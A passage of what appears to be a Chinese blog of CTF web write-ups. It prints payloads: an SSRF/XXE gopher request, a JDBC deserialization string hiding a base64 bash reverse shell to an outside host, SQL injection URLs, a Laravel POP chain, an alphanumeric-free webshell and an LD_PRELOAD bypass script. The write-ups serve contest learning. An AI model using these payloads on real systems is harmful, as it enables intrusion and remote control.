<figure class="highlight"><table><tr><td class="code"><pre><span class="line">a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520611%250D%250A%250D%250Adata%253D%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br></pre></td></tr></table></figure>

<h3 id="3-zzm’s-blog"><a href="#3-zzm’s-blog" class="headerlink" title="3.zzm’s blog"></a>3.<strong>zzm’s blog</strong></h3><p>根据题目给的pom.xml</p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626132854601.png" alt="image-20200626132854601"></p>
<p>和这篇<a href="https://b1ue.cn/archives/189.html#pom.xml" target="_blank" rel="noopener">文章</a>jdbc url可以指定导致rce</p>
<p>先搭一个<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">恶意的mysql服务器</a>和JAVA序列化的工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133727220.png" alt="image-20200626133727220"></p>
<p>接着监听端口</p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133825721.png" alt="image-20200626133825721"></p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:[<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>, <span class="string">"jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mICAgL2Rldi90Y3AvMS4xLjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133930336.png" alt="image-20200626133930336"></p>
<h3 id="4-美团外卖"><a href="#4-美团外卖" class="headerlink" title="4.美团外卖"></a>4.<strong>美团外卖</strong></h3><p><code>www.zip</code>源码泄露</p>
<p>在daochu.php存在注入</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">true$biao=<span class="string">'content'</span>;</span><br><span class="line">true$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span> //字段数为<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>回显4，6，2, 3</p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627101937077.png" alt="image-20200627101937077"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(schema_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata<span class="symbol">%23</span>  //数据库名</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102635262.png" alt="image-20200627102635262"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='cms'<span class="symbol">%23</span>   //表</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102842991.png" alt="image-20200627102842991"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>d'cms'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name<span class="symbol">%3</span>d'hint'<span class="symbol">%23</span> //字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104512801.png" alt="image-20200627104512801"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(hints)<span class="symbol">%20</span>from<span class="symbol">%20</span>hint<span class="symbol">%23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104803417.png" alt="image-20200627104803417"></p>
<p>开始不能访问的<code>/lib/webuploader/0.1.5/server/preview.php</code>加上这个目录就行了，POST数据就行</p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105703977.png" alt="image-20200627105703977"></p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105855419.png" alt="image-20200627105855419"></p>
<h3 id="5-laravel"><a href="#5-laravel" class="headerlink" title="5.laravel"></a>5.<strong>laravel</strong></h3><p><code>./artisan -v</code>  得到版本 <code>Laravel Framework 5.7.28</code></p>
<p>5.7.X版本存在一个反序列化漏洞,根据<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">文章</a>查看源码发现 <code>vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code>的 <code>run</code>方法被删除了，只能找其他链子</p>
<p>然后根据这篇<a href="https://www.anquanke.com/post/id/184541#h3-2%E3%80%82" target="_blank" rel="noopener">文章</a></p>
<p>根据文件对比工具</p>
<p><code>app\Http\Controllers\TaskController.php</code>有个反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">true <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">truetrue unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">true &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>routes\web.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure>

<p>POP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"> <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line"> <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"> $<span class="title">a</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>("<span class="title">addCollection</span>" =&gt; "<span class="title">system</span>"));</span><br><span class="line"> $b = <span class="keyword">new</span></span><br><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>第十届极客大挑战Write-up</title>
    <url>/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/第十届极客大挑战Writeup/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/第十届极客大挑战Writeup/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/第十届极客大挑战Writeup/1571363481025.png" alt="1571363481025"></p><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p><img src="/2019/10/第十届极客大挑战Writeup/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/第十届极客大挑战Writeup/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/第十届极客大挑战Writeup/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>











<h2 id="BurpSuiiiiiit-拿起你的burp，开始战斗吧"><a href="#BurpSuiiiiiit-拿起你的burp，开始战斗吧" class="headerlink" title="BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧"></a>BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧</h2><p>附件下载下来，解压得到Extender.jar文件</p>
<p>从名字和格式看应该BurpSuit的扩展包，用BP导入</p>
<p>​      <img src="/2019/10/第十届极客大挑战Writeup/1571495641219.png" alt="1571495641219"></p>
<p>​      <img src="/2019/10/第十届极客大挑战Writeup/1571374457080.png" alt="1571374457080"><br>​<br>​              导入失败，并提示我们查看errors页面<br>​<br>​             <img src="/2019/10/第十届极客大挑战Writeup/1571374537984.png" alt="1571374537984"></p>
<p>​        flag直接就出来了</p>
<h2 id="性感潇文清，在线算卦：动作快点才能算到好卦。"><a href="#性感潇文清，在线算卦：动作快点才能算到好卦。" class="headerlink" title="性感潇文清，在线算卦：动作快点才能算到好卦。"></a>性感潇文清，在线算卦：动作快点才能算到好卦。</h2><p>输入姓名和生日后，返回了一个路径</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571374815419.png" alt="1571374815419"></p>
<p>直接访问试下</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571374878503.png" alt="1571374878503"></p>
<p>回到主页，查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571374951634.png" alt="1571374951634"></p>
<p>提示我们条件竞争，从源码看我们输入u和p后，flag会写入到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>​        0.1s后再把flag换成 you are too slow</p>
<p>​        所以我们先一直访问存在flag的这个文件，然后在提交u和p，在flag生成的一瞬间把它读取</p>
<p>​        直接上burpsuit</p>
<p>​    <img src="/2019/10/第十届极客大挑战Writeup/1571375619875.png" alt="1571375619875"></p>
<p>​    <img src="/2019/10/第十届极客大挑战Writeup/1571376044998.png" alt="1571376044998"></p>
<p>​    payload设置为空，数量200个。</p>
<p>​    <img src="/2019/10/第十届极客大挑战Writeup/1571375724646.png" alt="1571375724646"></p>
<p>​    <img src="/2019/10/第十届极客大挑战Writeup/1571375756868.png" alt="1571375756868"></p>
<p>​    payload同样为空，数量为1.</p>
<p>​    2攻击后，3立马攻击</p>
<p>​    <img src="/2019/10/第十届极客大挑战Writeup/1571375974330.png" alt="1571375974330"></p>
<p>​    得到flag</p>
<h2 id="Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"><a href="#Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！" class="headerlink" title="Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"></a>Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！</h2><p><img src="/2019/10/第十届极客大挑战Writeup/1571386357741.png" alt="1571386357741"></p>
<p>什么防护都没有 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/1571387426532.png" alt="1571387426532">    </p>
<p>直接进后台</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571387449879.png" alt="1571387449879"></p>
<h2 id="RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I don’t think U can system RCE, prove to me"></a>RCE me: I don’t think U can system RCE, prove to me</h2><p>这道题学到了很多！</p>
<p>打开网页看看</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571495997995.png" alt="1571495997995"></p>
<p>GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
<p>所以我们要先绕过这个限制，执行命令。</p>
<p>参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">p神</a>不含数字和字母的webshell</p>
<p>构造脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<p>构造如下URl</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



<p><img src="/2019/10/第十届极客大挑战Writeup/1571497597408.png" alt="1571497597408"></p>
<p>查看某些关键参数</p>
<ul>
<li>​    如系统信息</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571499066521.png" alt="1571499066521"></p>
<ul>
<li>disable_functions</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571499768310.png" alt="1571499768310"></p>
<p>命令执行函数都被禁止了</p>
<ul>
<li>allow_url_*</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571498825445.png" alt="1571498825445"></p>
<p>关于这两个参数可以参考这篇文章<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">php伪协议</a></p>
<ul>
<li>sendmail_*</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571499021494.png" alt="1571499021494"></p>
<ul>
<li>open_basedir</li>
</ul>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571500306817.png" alt="1571500306817"></p>
<p>并没有限制我们目录。如果有可以参考这篇<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">文章</a>绕过</p>
<p>既然不能执行命令那就用var_dump(scandir())来查看文件信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/1571501644752.png" alt="1571501644752"></p>
<p>但感觉挺麻烦的，后面队友搞了个这个(躺着真舒服 )，直接蚁剑连(菜刀不行)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/1571502520704.png" alt="1571502520704"></p>
<p>发现主目录下有有flag和readflag，flag只能root才能查看</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571502747158.png" alt="1571502747158"></p>
<p>把readflag下载下来，反编译了一下</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571502795907.png" alt="1571502795907"></p>
<p>那么思路也就清晰起来了，bypass disable_functions  执行readflag</p>
<p>我们这里利用LD_PRELOAD劫持共享库，从而执行命令</p>
<p>具体原理看看<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">出题人的博客</a>和<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>首先上传恶意so文件，上面的github项目中有，注意操作系统位数</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/1571503296101.png" alt="1571503296101"></p>
<p>并且重命名为123.so</p>
<p>然后上传123.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后通过include()包含文件，执行系统命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/1571503618681.png" alt="1571503618681"></p>
<h2 id="李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code"><a href="#李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code" class="headerlink" title="李三的代码审计笔记第一页：Talk is easy ,show me the code."></a>李三的代码审计笔记第一页：Talk is easy ,show me the code.</h2><p>访问题目页面，给了源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span 